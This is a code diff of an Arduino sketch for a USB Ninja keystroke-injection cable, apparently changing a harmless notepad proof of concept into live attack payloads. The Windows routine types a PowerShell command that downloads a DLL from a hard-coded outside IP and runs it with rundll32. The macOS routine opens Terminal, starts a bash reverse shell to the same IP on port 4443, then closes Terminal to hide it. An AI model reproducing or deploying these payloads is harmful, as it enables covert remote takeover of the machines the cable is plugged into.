@@ -7,8 +7,11 @@ Author:
 
 #include <NinjaKeyboard.h>
 
-void setup() {}
+void setup(){}
+
 void loop() {}
+
+/* WINDOWS */
 
 void payloadA()
 {
@@ -24,7 +27,7 @@ void payloadA()
     NinjaKeyboard.delay(100);
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
     NinjaKeyboard.delay(500);
-    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://IP/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
+    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://159.65.137.232/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
     NinjaKeyboard.delay(100);
     NinjaKeyboard.end();
     USBninjaOffline();
@@ -32,24 +35,27 @@ void payloadA()
 
 }
 
-void payloadB()
-{
+/* MAC OS */
 
+void payloadB(){
     USBninjaOnline();
     NinjaKeyboard.begin();
     NinjaKeyboard.delay(1000);
     NinjaKeyboard.sendKeyStroke(0);
     NinjaKeyboard.delay(1000);
-    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    NinjaKeyboard.delay(100);
-    NinjaKeyboard.print(F("notepad"));
-    NinjaKeyboard.delay(100);
+    NinjaKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);   
+    NinjaKeyboard.delay(200);
+    NinjaKeyboard.print(F("Terminal"));
+    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
+    NinjaKeyboard.delay(1000); 
+    NinjaKeyboard.print(F("bash -i >& /dev/tcp/159.65.137.232/4443 0>&1 &"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
-    NinjaKeyboard.delay(500);
-    NinjaKeyboard.println(F("Hello there!\nThis is just a PoC of a working attack using USB Ninja. So,  in the next time, it wont be a notepad ;)"));
+    NinjaKeyboard.delay(1000); 
+    NinjaKeyboard.print(F("killall Terminal"));
+    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
+
+    // Stop and remove keyboard   
     NinjaKeyboard.delay(100);
     NinjaKeyboard.end();
     USBninjaOffline();
-    NinjaKeyboard.begin();
-
 }
